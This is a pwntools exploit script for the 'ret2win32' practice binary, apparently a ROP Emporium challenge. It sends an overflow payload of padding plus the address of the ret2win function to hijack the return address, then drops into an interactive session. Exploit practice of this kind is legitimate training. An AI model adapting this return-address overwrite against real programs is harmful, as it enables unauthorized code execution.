#!/usr/bin/python3

from pwn import *

PROG_NAME = "./ret2win32"

p = process(PROG_NAME)
elf = p.elf

if args.ATTACH:
	gdb.attach(p, '''break main''')

p.recvuntil(b'> ')

payload = b'A' * (0x28 + 0x4)
payload += p32(elf.symbols['ret2win'])

p.sendline(payload)

p.interactive()